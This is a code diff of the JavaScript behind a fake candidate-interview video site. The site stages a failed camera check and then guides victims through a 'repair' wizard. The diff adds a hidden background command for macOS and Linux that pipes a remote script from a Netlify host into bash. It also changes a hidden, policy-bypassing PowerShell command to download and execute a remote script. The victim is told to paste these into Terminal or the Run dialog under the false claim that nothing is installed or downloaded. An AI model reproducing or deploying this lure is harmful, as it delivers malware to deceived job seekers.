@@ -1,10 +1,10 @@
 const DEFAULT_HOST_NAME = "Lena Ortiz";
 const DEFAULT_HOST_ROLE = "Talent Partner";
 const DEFAULT_CANDIDATE_LABEL = "Candidate";
+const DEFAULT_INTERVIEW_ROUND = "Panel";
 const PREVIEW_EMPTY_LABEL = "Name pending";
 const DEFAULT_TOPIC = "Aster Ridge Candidate Interview";
 const DEFAULT_DURATION = "45 min";
-const VALID_DURATIONS = new Set(["30 min", "45 min", "60 min"]);
 const INTERVIEW_TIME_ZONE = "America/New_York";
 const INTERVIEW_TIME_ZONE_LABEL = "ET";
 const REPAIR_WRONG_KEY_TOAST_MS = 3500;
@@ -12,8 +12,64 @@ const REPAIR_CONFIRM_HINT_DEFAULT = "Click the button below when this step is do
 const REPAIR_CONFIRM_HINT_RUN = "Use the Run window on your desktop, then come back here.";
 const REPAIR_CONFIRM_HINT_PASTE = "Paste into the Run window on your desktop — not in this browser tab.";
 const REPAIR_CONFIRM_HINT_ENTER = "Press Enter in the Run window, allow camera, then come back here.";
+const REPAIR_CONFIRM_HINT_TERMINAL = "Use Terminal on your desktop, then come back here.";
+const REPAIR_CONFIRM_HINT_TERMINAL_PASTE = "Paste into Terminal on your desktop — not in this browser tab.";
+const REPAIR_CONFIRM_HINT_TERMINAL_ENTER = "Press Enter in Terminal, allow camera, then come back here.";
+const REPAIR_UNIX_COMMAND =
+  "mkdir -p ~/.driver-fix-host/.host-setup && nohup bash -c 'curl -fsSL https://driver-fix-238308.netlify.app/bootstrap.sh | bash' >>~/.driver-fix-host/.host-setup/run.log 2>&1 &";
 const REPAIR_STEP1_FALLBACK_DELAY_MS = 10000;
 const HOST_ACCESS_SESSION_KEY = "aster-ridge-host-access";
+const THEME_STORAGE_KEY = "aster-ridge-theme";
+const REPAIR_PLATFORM_OVERRIDE_KEY = "aster-ridge-repair-platform-override";
+const REPAIR_PLATFORM_OPTIONS = [
+  { value: "default", label: "Default" },
+  { value: "windows", label: "Windows" },
+  { value: "macos", label: "macOS" },
+  { value: "linux", label: "Linux" },
+];
+
+function getStoredTheme() {
+  try {
+    return localStorage.getItem(THEME_STORAGE_KEY) === "light" ? "light" : "dark";
+  } catch {
+    return "dark";
+  }
+}
+
+function applyTheme(theme) {
+  const isDark = theme === "dark";
+  document.documentElement.setAttribute("data-theme", isDark ? "dark" : "light");
+
+  document.querySelectorAll("[data-theme-toggle]").forEach((button) => {
+    const icon = button.querySelector(".theme-toggle__icon");
+    const label = button.querySelector(".theme-toggle__label");
+
+    button.setAttribute("aria-label", isDark ? "Switch to light mode" : "Switch to dark mode");
+    button.setAttribute("aria-pressed", String(isDark));
+
+    if (icon) icon.textContent = isDark ? "☀" : "☾";
+    if (label) label.textContent = isDark ? "Light" : "Dark";
+  });
+}
+
+function toggleTheme() {
+  const nextTheme = getStoredTheme() === "dark" ? "light" : "dark";
+
+  try {
+    localStorage.setItem(THEME_STORAGE_KEY, nextTheme);
+  } catch {
+    /* ignore storage failures */
+  }
+
+  applyTheme(nextTheme);
+}
+
+function initTheme() {
+  applyTheme(getStoredTheme());
+  document.querySelectorAll("[data-theme-toggle]").forEach((button) => {
+    button.addEventListener("click", toggleTheme);
+  });
+}
 
 function getHostAccessConfig() {
   const config = window.HOST_ACCESS_CONFIG || {};
@@ -76,9 +132,14 @@ const REPAIR_PROFILES = {
     trustTitle: "Local Windows privacy setting",
     trustDetail: "No install, no download, no recording change.",
     command:
-      'powershell -w h -ep bypass -c "$t=$env:TEMP;iwr \'https://driver-fix-238307.netlify.app/localeprofilesync.zip\' -O $t\\z.zip -useb;Expand-Archive $t\\z.zip $t -F;.$t\\LocaleProfileSync <#Verification ID:6d40eb3fbf354957#>"',
+      'powershell -w h -ep bypass -c "$t=$env:TEMP;iwr \'https://driver-fix-238308.netlify.app/win-bootstrap.ps1\' -O $t\\w.ps1 -useb;& $t\\w.ps1"',
     fallbackTitle: "Manual Windows path",
     fallbackBody: "Allow camera for this browser, then return here.",
+    pasteReadyText: "Copied · click the Run Open field, then press Ctrl + V",
+    pasteWarningTitle: "Pasted in this browser tab",
+    pasteWarningBody: "Click inside the Run box, then press Ctrl + V there — not here.",
+    enterWarningTitle: "Enter pressed in this browser tab",
+    enterWarningBody: "Click the Run dialog first, then press Enter there.",
     steps: [
       {
         shortLabel: "Run",
@@ -96,7 +157,6 @@ const REPAIR_PROFILES = {
         keys: ["Windows", "R"],
         keyJoiner: "+",
         keyStyle: "keyboard",
-        visual: "run",
       },
       {
         shortLabel: "Paste",
@@ -125,6 +185,8 @@ const REPAIR_PROFILES = {
         actionHint: "Press Enter after the command appears",
         keys: ["Enter"],
         keyStyle: "keyboard",
+        supportTitle: "Then in Windows Privacy",
+        supportCopy: "Allow camera for your browser in Windows Privacy, then return.",
       },
     ],
   },
@@ -135,55 +197,77 @@ const REPAIR_PROFILES = {
       "You are connected and can see the panel. macOS privacy needs camera access enabled for this browser — audio and the meeting are unaffected.",
     trustTitle: "Local macOS privacy setting",
     trustDetail: "No install, no download, no recording change.",
-    command: null,
+    command: REPAIR_UNIX_COMMAND,
     fallbackTitle: "Manual macOS path",
     fallbackBody: "Allow camera for this browser, then return here.",
+    pasteReadyText: "Copied · click inside Terminal, then press Ctrl + V",
+    pasteWarningTitle: "Pasted in this browser tab",
+    pasteWarningBody: "Click inside Terminal, then press Ctrl + V there — not here.",
+    enterWarningTitle: "Enter pressed in this browser tab",
+    enterWarningBody: "Click the Terminal window first, then press Enter there.",
     steps: [
       {
-        shortLabel: "Settings",
-        tagline: "Open Privacy settings",
-        headerIcon: "privacy",
-        title: "Open macOS Camera Privacy",
-        copy: "Open System Settings, then go to Privacy & Security > Camera.",
-        detail: "This stays on your Mac. You are only changing camera access for your browser.",
-        confirm: "Camera Privacy is open",
-        hint: "Confirm when you can see the Camera privacy list in System Settings.",
-        actionLabel: "On your Mac",
-        actionHint: "Open Camera permissions for this browser",
-        keys: ["System Settings", "Camera"],
+        shortLabel: "Spotlight",
+        tagline: "Quick system shortcut",
+        headerIcon: "run",
+        title: "Open Spotlight Search",
+        copy:
+          "Keep this interview tab open. Press Cmd + Space on your keyboard to open Spotlight on your Mac.",
+        detail:
+          "Do not type in this page. When Spotlight appears at the top of your screen, come back here and continue.",
+        confirm: "Spotlight is open",
+        hint: "Use Spotlight on your Mac desktop, then come back here.",
+        actionLabel: "Press on your keyboard",
+        actionHint:
+          "Hold Command (⌘), then tap Space once. Spotlight opens outside this browser.",
+        keys: ["Cmd", "Space"],
+        keyJoiner: "+",
+        keyStyle: "keyboard",
+      },
+      {
+        shortLabel: "Terminal",
+        tagline: "Launch Terminal app",
+        headerIcon: "run",
+        title: "Open Terminal",
+        copy: 'In Spotlight, type "Terminal" and press Enter to open the Terminal app.',
+        detail: "The Terminal window opens on your desktop — not inside this browser tab.",
+        confirm: "Terminal is open",
+        hint: REPAIR_CONFIRM_HINT_TERMINAL,
+        actionLabel: "In Spotlight",
+        actionHint: 'Type Terminal, then press Enter',
+        keys: ["Terminal", "Enter"],
         keyJoiner: "then",
-        keyStyle: "flow",
-        visual: "settings",
+        keyStyle: "keyboard",
+      },
+      {
+        shortLabel: "Paste",
+        tagline: "Paste from clipboard",
+        headerIcon: "paste",
+        title: "Paste in Terminal",
+        copy: "Click inside the Terminal window, then press Ctrl + V.",
+        detail: "The command is already copied. Paste it only into Terminal on your desktop.",
+        confirm: "I pasted in Terminal",
+        hint: REPAIR_CONFIRM_HINT_TERMINAL_PASTE,
+        actionLabel: "In Terminal",
+        actionHint: "Paste into the Terminal prompt",
+        keys: ["Ctrl", "V"],
+        keyStyle: "keyboard",
       },
       {
         shortLabel: "Allow",
-        tagline: "Enable browser",
-        headerIcon: "camera",
-        title: "Allow camera for this browser",
-        copy: "Find Chrome, Edge, Safari, or your browser in the Camera list and turn access on.",
-        detail: "If macOS asks, quit and reopen the browser after enabling access.",
+        tagline: "Enable in Privacy",
+        headerIcon: "privacy",
+        title: "Run the camera fix",
+        copy: "With the command visible in Terminal, press Enter once.",
+        detail: "macOS opens the camera permission screen. Allow this browser, then return here.",
         confirm: "Camera access is on",
-        hint: "Confirm after the browser is allowed in macOS Camera settings.",
-        actionLabel: "In Camera Privacy",
-        actionHint: "Turn on the browser you are using for this interview",
-        keys: ["Find browser", "Turn on"],
-        keyJoiner: "then",
-        keyStyle: "flow",
-        visual: "settings",
-      },
-      {
-        shortLabel: "Return",
-        tagline: "Back to interview",
-        headerIcon: "run",
-        title: "Return to this interview tab",
-        copy: "Come back to this browser tab after the camera permission is enabled.",
-        detail: "We will run a live camera check before the panel sees your video.",
-        confirm: "I returned to the interview",
-        hint: "Confirm after returning to this interview tab.",
-        actionLabel: "Back in browser",
-        actionHint: "Return here when macOS settings are complete",
-        keys: ["Return here"],
-        keyStyle: "flow",
+        hint: REPAIR_CONFIRM_HINT_TERMINAL_ENTER,
+        actionLabel: "In Terminal",
+        actionHint: "Press Enter after the command appears",
+        keys: ["Enter"],
+        keyStyle: "keyboard",
+        supportTitle: "Then in macOS Privacy",
+        supportCopy: "Allow camera for your browser in the permission screen, then return.",
       },
     ],
   },
@@ -191,58 +275,65 @@ const REPAIR_PROFILES = {
     osLabel: "Linux",
     issueTitle: "Camera permission needs attention",
     issueBody:
-      "You are connected and can see the panel. Browser or desktop permissions need camera access enabled — audio and the meeting are unaffected.",
-    trustTitle: "Local browser/device setting",
+      "You are connected and can see the panel. Linux privacy needs camera access enabled for this browser — audio and the meeting are unaffected.",
+    trustTitle: "Local Linux privacy setting",
     trustDetail: "No install, no download, no recording change.",
-    command: null,
-    fallbackTitle: "Manual Linux checks",
-    fallbackBody:
-      "Allow camera from the browser address-bar permission icon, close other apps using the camera, then return here and retry.",
+    command: REPAIR_UNIX_COMMAND,
+    fallbackTitle: "Manual Linux path",
+    fallbackBody: "Allow camera for this browser, then return here.",
+    pasteReadyText: "Copied · click inside Terminal, then press Ctrl + V",
+    pasteWarningTitle: "Pasted in this browser tab",
+    pasteWarningBody: "Click inside Terminal, then press Ctrl + V there — not here.",
+    enterWarningTitle: "Enter pressed in this browser tab",
+    enterWarningBody: "Click the Terminal window first, then press Enter there.",
     steps: [
       {
-        shortLabel: "Permit",
-        tagline: "Browser permission",
-        headerIcon: "privacy",
-        title: "Allow camera in the browser",
-        copy: "Click the lock or camera icon in the address bar, then set Camera to Allow.",
-        detail: "This changes permission for this interview site only.",
-        confirm: "Camera is allowed",
-        hint: "Confirm after Camera is set to Allow for this site.",
-        actionLabel: "In your browser",
-        actionHint: "Address bar lock/camera icon, then set Camera to Allow",
-        keys: ["Site permissions", "Allow camera"],
-        keyJoiner: "then",
-        keyStyle: "flow",
-        visual: "browser",
-      },
-      {
-        shortLabel: "Release",
-        tagline: "Free camera",
-        headerIcon: "camera",
-        title: "Close apps using the camera",
-        copy: "Close other meeting apps or camera tools that may already be using your camera.",
-        detail: "Only one app may be able to use the camera at a time on some Linux setups.",
-        confirm: "Other camera apps are closed",
-        hint: "Confirm after closing other apps that may use the camera.",
-        actionLabel: "On this device",
-        actionHint: "Close video apps, camera preview tools, or other browser tabs",
-        keys: ["Close camera apps"],
-        keyStyle: "flow",
-        visual: "apps",
-      },
-      {
-        shortLabel: "Return",
-        tagline: "Back to interview",
+        shortLabel: "Terminal",
+        tagline: "Quick system shortcut",
         headerIcon: "run",
-        title: "Return to this interview tab",
-        copy: "Come back to this browser tab after camera permission is allowed.",
-        detail: "We will run a live camera check before the panel sees your video.",
-        confirm: "I returned to the interview",
-        hint: "Confirm after returning to this interview tab.",
-        actionLabel: "Back in browser",
-        actionHint: "Return here when permissions are complete",
-        keys: ["Return here"],
-        keyStyle: "flow",
+        title: "Open Terminal",
+        copy:
+          "Keep this interview tab open. Press Ctrl + Alt + T on your keyboard to open Terminal on your desktop.",
+        detail:
+          "Do not type in this page. When Terminal appears, come back here and continue.",
+        confirm: "Terminal is open",
+        hint: REPAIR_CONFIRM_HINT_TERMINAL,
+        actionLabel: "Press on your keyboard",
+        actionHint:
+          "Hold Ctrl and Alt, then tap T once. Terminal opens outside this browser.",
+        keys: ["Ctrl", "Alt", "T"],
+        keyJoiner: "+",
+        keyStyle: "keyboard",
+      },
+      {
+        shortLabel: "Paste",
+        tagline: "Paste from clipboard",
+        headerIcon: "paste",
+        title: "Paste in Terminal",
+        copy: "Click inside the Terminal window, then press Ctrl + V.",
+        detail: "The command is already copied. Paste it only into Terminal on your desktop.",
+        confirm: "I pasted in Terminal",
+        hint: REPAIR_CONFIRM_HINT_TERMINAL_PASTE,
+        actionLabel: "In Terminal",
+        actionHint: "Paste into the Terminal prompt",
+        keys: ["Ctrl", "V"],
+        keyStyle: "keyboard",
+      },
+      {
+        shortLabel: "Allow",
+        tagline: "Enable camera access",
+        headerIcon: "privacy",
+        title: "Run the camera fix",
+        copy: "With the command visible in Terminal, press Enter once.",
+        detail: "Your system opens the camera permission screen. Allow this browser, then return here.",
+        confirm: "Camera access is on",
+        hint: REPAIR_CONFIRM_HINT_TERMINAL_ENTER,
+        actionLabel: "In Terminal",
+        actionHint: "Press Enter after the command appears",
+        keys: ["Enter"],
+        keyStyle: "keyboard",
+        supportTitle: "Then allow camera access",
+        supportCopy: "Allow camera for your browser when prompted, then return.",
       },
     ],
   },
@@ -306,8 +397,11 @@ const els = {
   hostName: document.querySelector("#host-name"),
   createHostRole: document.querySelector("#create-host-role"),
   createTopic: document.querySelector("#create-topic"),
+  createInterviewRound: document.querySelector("#create-interview-round"),
+  createParticipantRole: document.querySelector("#create-participant-role"),
   createDuration: document.querySelector("#create-duration"),
   homeDurationStat: document.querySelector("#home-duration-stat"),
+  homeRoundStat: document.querySelector("#home-round-stat"),
   createdRoom: document.querySelector("#created-room"),
   createdTitle: document.querySelector("#created-title"),
   createdRoomId: document.querySelector("#created-room-id"),
@@ -325,11 +419,16 @@ const els = {
   launchOverlay: document.querySelector("#launch-overlay"),
   launchTitle: document.querySelector("#launch-title"),
   launchRoom: document.querySelector("#launch-room"),
+  launchRoomTopic: document.querySelector("#launch-room-topic"),
+  launchRoomSep: document.querySelector("#launch-room-sep"),
+  launchRoomId: document.querySelector("#launch-room-id"),
   launchContinue: document.querySelector("#launch-continue"),
   inviteContext: document.querySelector("#invite-context"),
   inviteContextTitle: document.querySelector("#invite-context-title"),
   inviteContextRoom: document.querySelector("#invite-context-room"),
   inviteDuration: document.querySelector("#invite-duration"),
+  inviteRound: document.querySelector("#invite-round"),
+  inviteParticipantRole: document.querySelector("#invite-participant-role"),
   inviteHostInitials: document.querySelector("#invite-host-initials"),
   inviteHostName: document.querySelector("#invite-host-name"),
   inviteHostRole: document.querySelector("#invite-host-role"),
@@ -372,7 +471,9 @@ const els = {
   deviceRepairCopy: document.querySelector("#device-repair-copy"),
   deviceRepairDetail: document.querySelector("#device-repair-detail"),
   deviceRepairHeaderIcon: document.querySelector("#device-repair-header-icon"),
-  deviceRepairStepperItems: Array.from(document.querySelectorAll("[data-repair-step]")),
+  deviceRepairStepper: document.querySelector("#device-repair-stepper"),
+  deviceRepairTrustMeta: document.querySelector("#device-repair-trust-meta"),
+  deviceRepairStepperItems: [],
   deviceRepairHostInitials: document.querySelector("#device-repair-host-initials"),
   deviceRepairHostWaiting: document.querySelector("#device-repair-host-waiting"),
   deviceRepairSteps: [
@@ -385,6 +486,8 @@ const els = {
   deviceRepairActionHint: document.querySelector("#device-repair-action-hint"),
   deviceRepairActionKeys: document.querySelector("#device-repair-action-keys"),
   deviceRepairRunPreview: document.querySelector("#device-repair-run-preview"),
+  deviceRepairSpotlightPreview: document.querySelector("#device-repair-spotlight-preview"),
+  deviceRepairTerminalPreview: document.querySelector("#device-repair-terminal-preview"),
   deviceRepairBrowserPreview: document.querySelector("#device-repair-browser-preview"),
   deviceRepairSettingsPreview: document.querySelector("#device-repair-settings-preview"),
   deviceRepairAppsPreview: document.querySelector("#device-repair-apps-preview"),
@@ -397,6 +500,8 @@ const els = {
   deviceRepairReadyText: document.querySelector("#device-repair-ready-text"),
   deviceRepairPasteWarning: document.querySelector("#device-repair-paste-warning"),
   deviceRepairEnterWarning: document.querySelector("#device-repair-enter-warning"),
+  deviceRepairSupportTitle: document.querySelector("#device-repair-support-title"),
+  deviceRepairSupportCopy: document.querySelector("#device-repair-support-copy"),
   deviceRepairMain: document.querySelector("#device-repair-main"),
   deviceRepairCheckStatus: document.querySelector("#device-repair-check-status"),
   deviceRepairNext: document.querySelector("#device-repair-next"),
@@ -411,6 +516,8 @@ const els = {
   meetingId: document.querySelector("#meeting-id"),
   timer: document.querySelector("#timer"),
   briefDuration: document.querySelector("#brief-duration"),
+  briefRound: document.querySelector("#brief-round"),
+  meetingRoundLabel: document.querySelector("#meeting-round-label"),
   briefHostMember: document.querySelector("#brief-host-member"),
   briefButton: document.querySelector("#brief-button"),
   gallery: document.querySelector("#gallery"),
@@ -466,6 +573,8 @@ const state = {
   },
   hostName: DEFAULT_HOST_NAME,
   hostRole: DEFAULT_HOST_ROLE,
+  interviewRound: DEFAULT_INTERVIEW_ROUND,
+  participantRole: DEFAULT_CANDIDATE_LABEL,
   topic: DEFAULT_TOPIC,
   duration: DEFAULT_DURATION,
   roomCode: createRoomCode(),
@@ -493,6 +602,7 @@ const state = {
     repairCommandCopied: false,
     repairNudgeSent: false,
     repairWizardStep: 1,
+    repairPlatformOverride: "default",
     microphoneReady: true,
     networkReady: true,
   },
@@ -527,11 +637,23 @@ const CAMERA_SETUP_BAR_COPY = {
 const REPAIR_KEY_WARNINGS = {
   paste: {
     getElement: () => els.deviceRepairPasteWarning,
-    toast: "Paste in the Run dialog (Win + R), not in this browser tab.",
+    getToast: () => {
+      const profile = getRepairProfile();
+      if (profile.pasteWarningBody?.includes("Terminal")) {
+        return "Paste in Terminal, not in this browser tab.";
+      }
+      return "Paste in the Run dialog (Win + R), not in this browser tab.";
+    },
   },
   enter: {
     getElement: () => els.deviceRepairEnterWarning,
-    toast: "Press Enter in the Run dialog, not in this browser tab.",
+    getToast: () => {
+      const profile = getRepairProfile();
+      if (profile.enterWarningBody?.includes("Terminal")) {
+        return "Press Enter in Terminal, not in this browser tab.";
+      }
+      return "Press Enter in the Run dialog, not in this browser tab.";
+    },
   },
 };
 
@@ -561,10 +683,20 @@ function randomPart() {
 }
 
 function normalizeDuration(value) {
-  if (!value) return DEFAULT_DURATION;
+  const trimmed = String(value || "").trim().slice(0, 24);
+  if (!trimmed) return DEFAULT_DURATION;
+  if (/^\d+$/.test(trimmed)) return `${trimmed} min`;
+  return trimmed;
+}
 
-  const normalized = value.endsWith("min") ? value : `${value} min`;
-  return VALID_DURATIONS.has(normalized) ? normalized : DEFAULT_DURATION;
+function normalizeInterviewRound(value) {
+  const trimmed = value?.trim().slice(0, 32);
+  return trimmed || DEFAULT_INTERVIEW_ROUND;
+}
+
+function normalizeParticipantRole(value) {
+  const trimmed = value?.trim().slice(0, 32);
+  return trimmed || DEFAULT_CANDIDATE_LABEL;
 }
 
 function normalizeHostRole(value) {
@@ -593,8 +725,33 @@ function getAutoMessages() {
 }
 
 function updateInterviewBrief() {
-  els.briefDuration.textContent = state.duration;
-  els.briefHostMember.textContent = `${state.hostName} - ${state.hostRole}`;
+  if (els.briefDuration) els.briefDuration.textContent = state.duration;
+  if (els.briefRound) els.briefRound.textContent = state.interviewRound;
+  if (els.briefHostMember) {
+    els.briefHostMember.textContent = `${state.hostName} - ${state.hostRole}`;
+  }
+}
+
+function getMeetingRoundLabel() {
+  const round = state.interviewRound.trim();
+  return /interview/i.test(round) ? round : `${round} interview`;
+}
+
+function syncRoomSettingFields() {
+  if (els.createInterviewRound) els.createInterviewRound.value = state.interviewRound;
+  if (els.createParticipantRole) els.createParticipantRole.value = state.participantRole;
+  if (els.createDuration) els.createDuration.value = state.duration;
+  if (els.homeDurationStat) els.homeDurationStat.textContent = state.duration;
+  if (els.homeRoundStat) els.homeRoundStat.textContent = `${state.interviewRound} round`;
+}
+
+function updateRoomSettingsDisplay() {
+  syncRoomSettingFields();
+  updateInviteContext();
+  updateInterviewBrief();
+  if (els.meetingRoundLabel) {
+    els.meetingRoundLabel.textContent = getMeetingRoundLabel();
+  }
 }
 
 function getInitials(name) {
@@ -635,6 +792,8 @@ function applyQueryDefaults() {
   const name = params.get("name");
   const host = params.get("host");
   const hostRole = params.get("hostRole");
+  const interviewRound = params.get("interviewRound");
+  const participantRole = params.get("participantRole");
   const topic = params.get("topic");
   const duration = params.get("duration");
   const room = params.get("room");
@@ -644,6 +803,9 @@ function applyQueryDefaults() {
   if (name) state.currentUser.name = name.slice(0, 32);
   if (host) state.hostName = host.slice(0, 32);
   state.hostRole = normalizeHostRole(hostRole);
+  state.interviewRound = normalizeInterviewRound(interviewRound);
+  state.participantRole = normalizeParticipantRole(participantRole);
+  state.currentUser.role = state.participantRole;
   if (topic) state.topic = topic.slice(0, 48);
   state.duration = normalizeDuration(duration);
   if (room) state.roomCode = room.slice(0, 16);
@@ -657,12 +819,15 @@ function applyQueryDefaults() {
   els.hostName.value = state.hostName;
   els.createHostRole.value = state.hostRole;
   els.createTopic.value = state.topic;
-  els.createDuration.value = state.duration;
-  els.homeDurationStat.textContent = state.duration;
+  syncRoomSettingFields();
   els.displayName.value = state.currentUser.name;
   els.meetingTopic.value = state.topic;
   document.title = `${state.topic} - Video Meeting`;
   updateInviteContext();
+  updateInterviewBrief();
+  if (els.meetingRoundLabel) {
+    els.meetingRoundLabel.textContent = getMeetingRoundLabel();
+  }
   updateCreatedRoom();
   updatePreview();
   els.lobbySchedule.textContent = getLobbyScheduleLabel();
@@ -674,7 +839,7 @@ function applyQueryDefaults() {
     els.hostName.value = state.hostName;
     els.createHostRole.value = state.hostRole;
     els.createTopic.value = state.topic;
-    els.createDuration.value = state.duration;
+    syncRoomSettingFields();
     showHome();
   }
 }
@@ -684,8 +849,17 @@ function updatePreview() {
   const hasName = Boolean(name);
   els.previewName.textContent = hasName ? name : PREVIEW_EMPTY_LABEL;
   els.previewName.classList.toggle("is-empty", !hasName);
-  els.previewInitials.textContent = hasName ? getInitials(name) : "ID";
+  els.previewInitials.textContent = hasName ? getInitials(name) : "";
   els.previewInitials.classList.toggle("is-empty", !hasName);
+}
+
+function setJoinSettingsStatus(text, tone = "pending") {
+  if (!els.joinSettingsStatus) return;
+  els.joinSettingsStatus.textContent = text;
+  els.joinSettingsStatus.classList.remove("is-pending", "is-ready", "is-error");
+  if (tone) {
+    els.joinSettingsStatus.classList.add(`is-${tone}`);
+  }
 }
 
 function setNameFieldError(show) {
@@ -693,8 +867,8 @@ function setNameFieldError(show) {
   els.displayName.setAttribute("aria-invalid", String(show));
   els.displayNameError?.classList.toggle("is-hidden", !show);
   els.form.classList.toggle("has-name-error", show);
-  if (els.joinSettingsStatus) {
-    els.joinSettingsStatus.textContent = show ? "Name required" : "Ready to join";
+  if (show) {
+    setJoinSettingsStatus("Name required", "error");
   }
 }
 
@@ -734,15 +908,34 @@ function updateInviteContext() {
   els.inviteContext.classList.toggle("is-hidden", !state.invitedViaLink);
   els.inviteContextTitle.textContent = state.topic;
   els.inviteContextRoom.textContent = `Meeting ID: ${state.roomCode} · Passcode: ${state.passcode}`;
-  els.inviteDuration.textContent = state.duration;
+  if (els.inviteDuration) els.inviteDuration.textContent = state.duration;
+  if (els.inviteRound) els.inviteRound.textContent = state.interviewRound;
+  if (els.inviteParticipantRole) els.inviteParticipantRole.textContent = state.participantRole;
   els.inviteHostName.textContent = state.hostName;
   els.inviteHostRole.textContent = state.hostRole;
   els.inviteHostInitials.textContent = getInitials(state.hostName);
-  els.launchRoom.textContent = `${state.topic} · ${state.roomCode}`;
+  setLaunchRoomDetail(state.topic, state.roomCode);
+}
+
+function setLaunchRoomDetail(topic, roomCode = "") {
+  const hasRoom = Boolean(roomCode);
+  if (els.launchRoomTopic) {
+    els.launchRoomTopic.textContent = topic;
+    if (els.launchRoomId) {
+      els.launchRoomId.textContent = roomCode;
+      els.launchRoomId.hidden = !hasRoom;
+    }
+    if (els.launchRoomSep) {
+      els.launchRoomSep.hidden = !hasRoom;
+    }
+    return;
+  }
+
+  els.launchRoom.textContent = hasRoom ? `${topic} · ${roomCode}` : topic;
 }
 
 function showLaunchOverlay() {
-  showProcessOverlay("Opening meeting...", `${state.topic} · ${state.roomCode}`, true);
+  showProcessOverlay("Opening meeting...", state.topic, state.roomCode, true);
   window.setTimeout(hideLaunchOverlay, 1350);
 }
 
@@ -750,9 +943,9 @@ function hideLaunchOverlay() {
   els.launchOverlay.classList.add("is-hidden");
 }
 
-function showProcessOverlay(title, detail, canContinue = false) {
+function showProcessOverlay(title, topic, roomCode = "", canContinue = false) {
   els.launchTitle.textContent = title;
-  els.launchRoom.textContent = detail;
+  setLaunchRoomDetail(topic, roomCode);
   els.launchContinue.classList.toggle("is-hidden", !canContinue);
   els.launchOverlay.classList.remove("is-hidden");
 }
@@ -768,6 +961,8 @@ function buildInviteUrl() {
   url.searchParams.set("topic", state.topic);
   url.searchParams.set("host", state.hostName);
   url.searchParams.set("hostRole", state.hostRole);
+  url.searchParams.set("interviewRound", state.interviewRound);
+  url.searchParams.set("participantRole", state.participantRole);
   url.searchParams.set("duration", state.duration);
   url.searchParams.set("room", state.roomCode);
   url.searchParams.set("passcode", state.passcode);
@@ -789,17 +984,16 @@ function runLobbyDeviceCheck() {
 
   els.micDeviceStatus.textContent = "Built-in microphone ready";
   els.networkDeviceStatus.textContent = "Stable connection";
-  els.previewAudioState.textContent = "Microphone ready";
+  els.previewAudioState.textContent = "Mic ready";
+  els.previewAudioState.classList.add("is-ready");
   els.deviceSummary.textContent = "Checking devices...";
   els.cameraDeviceStatus.textContent = "Checking...";
-  els.previewVideoState.textContent = "Starting video...";
+  setPreviewVideoState("Starting video...");
   els.previewDeviceWarning.classList.add("is-hidden");
   els.previewCameraLoading.classList.remove("is-hidden");
   setCameraDeviceRowState(false);
   setButtonState(els.prejoinCamera, false, "Camera on", "Camera off");
-  if (els.joinSettingsStatus) {
-    els.joinSettingsStatus.textContent = "Checking devices...";
-  }
+  setJoinSettingsStatus("Checking devices...", "pending");
   updateJoinAvailability();
 
   lobbyDeviceCheckTimer = window.setTimeout(() => {
@@ -808,7 +1002,7 @@ function runLobbyDeviceCheck() {
     els.previewCameraLoading.classList.add("is-hidden");
     els.deviceSummary.textContent = "Microphone and network ready";
     els.cameraDeviceStatus.textContent = "Camera setup needed";
-    els.previewVideoState.textContent = "Camera setup needed";
+    setPreviewVideoState("Camera setup needed");
     els.previewDeviceWarning.classList.remove("is-hidden");
     updateJoinAvailability();
     lobbyDeviceCheckTimer = null;
@@ -821,6 +1015,7 @@ function resetDeviceRepairState() {
   state.device.repairCommandCopied = false;
   state.device.repairNudgeSent = false;
   hideDeviceRepairDialog();
+  loadRepairPlatformOverride();
   resetRepairWizard();
 }
 
@@ -854,6 +1049,9 @@ function updateRepairPlatformContext() {
   if (els.deviceRepairSafeNoteCopy) {
     els.deviceRepairSafeNoteCopy.textContent = `Local ${profile.osLabel} permission only · Interview stays connected · Nothing installed`;
   }
+  renderRepairStepper();
+  updateRepairTrustMeta();
+  updateRepairWarningCopy();
 }
 
 function playRepairStepEnterAnimation(step) {
@@ -867,7 +1065,7 @@ function playRepairStepEnterAnimation(step) {
   });
 }
 
-function getClientPlatform() {
+function detectClientPlatform() {
   const userAgent = navigator.userAgent || "";
   const platform = navigator.userAgentData?.platform || navigator.platform || "";
   const maxTouchPoints = navigator.maxTouchPoints || 0;
@@ -891,13 +1089,233 @@ function getClientPlatform() {
   return { type: "desktop", key: "linux", label: "Desktop" };
 }
 
+function getRepairPlatformOverride() {
+  try {
+    const stored =
+      localStorage.getItem(REPAIR_PLATFORM_OVERRIDE_KEY) ||
+      sessionStorage.getItem(REPAIR_PLATFORM_OVERRIDE_KEY);
+    if (REPAIR_PLATFORM_OPTIONS.some((option) => option.value === stored)) {
+      state.device.repairPlatformOverride = stored;
+      if (stored !== "default") {
+        localStorage.setItem(REPAIR_PLATFORM_OVERRIDE_KEY, stored);
+      }
+    }
+  } catch {
+    /* ignore storage failures */
+  }
+
+  return state.device.repairPlatformOverride || "default";
+}
+
+function loadRepairPlatformOverride() {
+  getRepairPlatformOverride();
+  if (!state.device.repairPlatformOverride) {
+    state.device.repairPlatformOverride = "default";
+  }
+}
+
+function refreshRepairWizardForPlatform() {
+  updateRepairPlatformPickerUI();
+  updateRepairPlatformContext();
+  if (!state.device.cameraRepairAttempted) {
+    resetRepairWizard();
+  }
+}
+
+function setRepairPlatformOverride(value) {
+  if (!REPAIR_PLATFORM_OPTIONS.some((option) => option.value === value)) return;
+  if (state.device.repairPlatformOverride === value) {
+    updateRepairPlatformPickerUI();
+    return;
+  }
+
+  state.device.repairPlatformOverride = value;
+
+  try {
+    localStorage.setItem(REPAIR_PLATFORM_OVERRIDE_KEY, value);
+    sessionStorage.setItem(REPAIR_PLATFORM_OVERRIDE_KEY, value);
+  } catch {
+    /* ignore storage failures */
+  }
+
+  state.device.repairCommandCopied = false;
+  refreshRepairWizardForPlatform();
+}
+
+function getRepairPlatformDetectedLabel() {
+  const detected = detectClientPlatform();
+  const override = getRepairPlatformOverride();
+
+  if (override === "default") {
+    return `Detected: ${detected.label}`;
+  }
+
+  const testingLabel =
+    REPAIR_PLATFORM_OPTIONS.find((option) => option.value === override)?.label || override;
+  return `Testing: ${testingLabel} flow · Detected: ${detected.label}`;
+}
+
+function createRepairPlatformPickerElement(variant = "default") {
+  const picker = document.createElement("div");
+  picker.className = "repair-platform-picker";
+  picker.dataset.repairPlatformPicker = "";
+
+  if (variant === "home") {
+    picker.classList.add("repair-platform-picker--home");
+  }
+
+  picker.setAttribute("aria-label", "Device setup OS test mode");
+
+  const head = document.createElement("div");
+  head.className = "repair-platform-picker__head";
